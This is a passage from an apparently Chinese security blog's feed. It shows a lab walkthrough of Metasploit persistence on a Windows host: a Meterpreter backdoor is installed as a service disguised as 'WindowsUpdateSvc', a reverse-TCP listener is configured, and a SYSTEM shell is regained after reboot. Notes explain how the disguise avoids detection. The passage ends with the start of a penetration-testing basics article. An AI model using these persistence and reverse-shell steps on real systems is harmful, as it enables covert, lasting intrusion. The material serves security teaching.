&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;windows/local/persistence_service&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run &lt;span class="c1"&gt;#执行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4446
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Running module against ANKH-PC
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter service exe written to C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\T&lt;/span&gt;EMP&lt;span class="se"&gt;\k&lt;/span&gt;eQgBw.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Creating service WindowsUpdateSvc
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ANKH-PC_20251231.0748/ANKH-PC_20251231.0748.rc
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;177734&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4446 -&amp;gt; 10.0.0.17:49159&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 09:07:49 +0000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;PS：由于该模块创建了一个持久化服务并且立刻启动了该服务，因此该服务会主动向攻击机发起连接。因此启动该模块后立刻创建了一个新的会话（session 2）。两个会话的权限相同&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;创建监听器&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端2：监听配置&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 &amp;gt; use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Using configured payload generic/shell_reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; payload windows/meterpreter/reverse_tcp &lt;span class="c1"&gt;# 与攻击配置一致&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; windows/meterpreter/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LHOST 10.0.0.223 &lt;span class="c1"&gt;# 绑定攻击机IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LHOST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; 10.0.0.223
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; LPORT &lt;span class="m"&gt;4446&lt;/span&gt; &lt;span class="c1"&gt;# 绑定监听端口&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;LPORT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="m"&gt;4446&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nb"&gt;set&lt;/span&gt; ExitOnSession &lt;span class="nb"&gt;false&lt;/span&gt; &lt;span class="c1"&gt;# 即使断开也保持监听&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;ExitOnSession&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="nb"&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; run -j &lt;span class="c1"&gt;# -j为后台运行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exploit running as background job 0.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exploit completed, but no session was created.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Started reverse TCP handler on 10.0.0.223:4446
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start="3"&gt;
&lt;li&gt;重启靶机&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端1：（重启靶机，无需登录）原会话断开&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17 - Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; closed. Reason: Died
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 10.0.0.17 - Meterpreter session &lt;span class="m"&gt;2&lt;/span&gt; closed. Reason: Died
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start="4"&gt;
&lt;li&gt;靶机自动连接监听器&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 终端2：监听到新的会话连接（SYSTEM权限）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Sending stage &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;177734&lt;/span&gt; bytes&lt;span class="o"&gt;)&lt;/span&gt; to 10.0.0.17
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Meterpreter session &lt;span class="m"&gt;1&lt;/span&gt; opened &lt;span class="o"&gt;(&lt;/span&gt;10.0.0.223:4446 -&amp;gt; 10.0.0.17:49205&lt;span class="o"&gt;)&lt;/span&gt; at 2025-12-31 09:09:46 +0000
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; sessions
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Active &lt;span class="nv"&gt;sessions&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;===============&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Id Name Type Information Connection
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -- ---- ---- ----------- ----------
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;1&lt;/span&gt; meterpreter x86/win NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM 10.0.0.223:4446 -&amp;gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; dows @ ANKH-PC 0.0.0.17:49205 &lt;span class="o"&gt;(&lt;/span&gt;10.0
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; .0.17&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;msf6 exploit&lt;span class="o"&gt;(&lt;/span&gt;multi/handler&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; sessions -i &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Starting interaction with 1...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; getuid
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Server username: NT AUTHORITY&lt;span class="se"&gt;\S&lt;/span&gt;YSTEM
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h5 id="相关原理"&gt;相关原理
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;持久化机制&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;生成meterpreter后门程序&lt;/strong&gt; → C:\Windows\TEMP\keQgBw.exe&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;创建Windows服务&lt;/strong&gt; → &amp;ldquo;WindowsUpdateSvc&amp;rdquo;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;配置服务自动启动（开机自启）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务指向后门程序路径&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务伪装技巧&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;服务名伪装&lt;/strong&gt;：使用&lt;code&gt;WindowsUpdateSvc&lt;/code&gt;这样的合法名称，避免被轻易发现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件路径&lt;/strong&gt;：存放在&lt;code&gt;C:\Windows\TEMP\&lt;/code&gt;，利用系统目录降低怀疑&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;权限继承&lt;/strong&gt;：服务以SYSTEM权限运行，维持高权限访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络通信机制&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;反向连接&lt;/strong&gt;：靶机主动连接攻击机（10.0.0.223:4446）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优势&lt;/strong&gt;：可绕过出站防火墙限制（大多数防火墙允许出站连接）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;稳定性&lt;/strong&gt;：即使连接断开也会尝试重连&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id="四shell"&gt;四、Shell
&lt;/h4&gt;&lt;p&gt;在&lt;code&gt;meterpreter&lt;/code&gt;下执行shell可以SYSTEM身份进入靶机终端。由于编码问题（Windows终端采用GBK编码，而Kali终端采用UTF-8编码）shell后可能出现乱码，可以通过指令修改靶机编码方式（&lt;code&gt;chcp 65001&lt;/code&gt;，Windows命令提示符(cmd)中设置代码页(Code Page)的命令）以解决该问题&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt; shell
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Process &lt;span class="m"&gt;1028&lt;/span&gt; created.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Channel &lt;span class="m"&gt;2&lt;/span&gt; created.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Microsoft Windows &lt;span class="o"&gt;[&lt;/span&gt;�汾 6.1.7600&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;��Ȩ���� &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2009&lt;/span&gt; Microsoft Corporation����������Ȩ����
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;chcp &lt;span class="m"&gt;65001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;chcp &lt;span class="m"&gt;65001&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Active code page: &lt;span class="m"&gt;65001&lt;/span&gt; &lt;span class="c1"&gt;# 936对应GBK，65001对应UTF-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nt authority&lt;span class="se"&gt;\s&lt;/span&gt;ystem
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\W&lt;/span&gt;indows&lt;span class="se"&gt;\s&lt;/span&gt;ystem32&amp;gt;cd C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;tree /f
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;tree /f Folder PATH listing
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Volume serial number is 000001BD 0014:5107
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:.
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Hello.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; hi.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;No subfolders exist
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;type Hello.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;type&lt;/span&gt; Hello.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Hello?
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;C:&lt;span class="se"&gt;\U&lt;/span&gt;sers&lt;span class="se"&gt;\A&lt;/span&gt;nkh&lt;span class="se"&gt;\D&lt;/span&gt;esktop&amp;gt;exit
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;meterpreter &amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description></item><item><title>渗透测试基础</title><link>http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</link><pubDate>Tue, 30 Dec 2025 14:51:56 +0800</pubDate><guid>http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</guid><description>&lt;h1 id="渗透测试基础"&gt;渗透测试基础
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;概述&lt;/strong&gt;：通过各种手段对目标进行渗透攻击，通过渗透来测试目标的安全防护能力&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;底层基础&lt;/strong&gt;：目标系统中存在安全漏洞（Loophole，指信息系统中存在的缺陷或不适当的配置，其可使攻击者在未授权情况下访问或破坏系统，导致信息系统面临安全风险）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;渗透代码（Exploit）&lt;/strong&gt;：利用安全漏洞来造成入侵或破坏效果的程序或者漏洞利用代码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="测试分类"&gt;测试分类
&lt;/h2&gt;&lt;h3 id="黑盒测试"&gt;黑盒测试
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;概念：&lt;/strong&gt; 测试人员在&lt;strong&gt;完全不了解&lt;/strong&gt;目标系统内部结构、源代码、网络拓扑、技术栈等信息的情况下进行测试。他们仅拥有一个公开的访问点（例如一个网站URL或公司名称）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;信息来源：&lt;/strong&gt; 完全依赖公开信息收集，如搜索引擎、Whois查询、社交媒体、公开端口扫描等。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;优点：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;模拟真实攻击：&lt;/strong&gt; 最接近恶意黑客的真实攻击场景。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;测试外部防御：&lt;/strong&gt; 能有效评估边界安全防护（如防火墙、WAF）和暴露在外的服务的安全性。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注业务逻辑漏洞：&lt;/strong&gt; 更容易从用户视角发现业务逻辑缺陷。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;缺点：&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;效率较低：&lt;/strong&gt; 需要大量时间进行信息收集和摸索，可能无法覆盖深层次漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;覆盖面有限：&lt;/strong&gt; 很难在有限时间内测试到所有内部接口和路径，可能遗漏隐藏漏洞。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;深度不足：&lt;/strong&gt; 难以发现由糟糕的代码实现、错误的配置等引起的深层安全问题。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;适用场景：&lt;/strong&gt; 外部网络渗透测试、红队演练、模拟APT攻击、对已上线系统进行外部风险评估。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="白盒测试"&gt;白盒测试
&lt;/h3&gt;&lt;ul&gt;
